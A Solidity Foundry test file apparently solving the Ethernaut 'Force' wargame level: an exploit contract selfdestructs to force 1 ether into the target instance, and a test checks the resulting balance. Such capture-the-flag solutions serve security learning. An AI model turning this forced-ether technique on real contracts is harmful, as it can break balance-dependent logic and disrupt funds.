// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {IForce} from "ethernaut/7Force.sol";
import {BaseTest} from "./BaseTest.t.sol";

contract ForceExploit {
    address payable force;

    constructor(address payable _force) payable {
        force = _force;
    }

    function exploit() public {
        assembly {
            selfdestruct(sload(force.slot))
        }
    }

    receive() external payable {}
}

contract ForceTest is BaseTest {
    IForce public forceInstance = IForce(0x85115E3Bb9739dfDb3629e8f0539e1d013BF7678);

    function setUp() public override {
        super.setUp();
    }

    function exploitSol() internal override {
        ForceExploit forceExploit = new ForceExploit(payable(address(forceInstance)));
        address(forceExploit).call{value: 1 ether}("");
        forceExploit.exploit();
    }

    function testExploitSol() public override {
        exploitSol();
        assertEq(address(forceInstance).balance, 1 ether);
    }

    function exploitYul() internal override {}

    function testExploitYul() public override {
        exploitYul();
    }
}
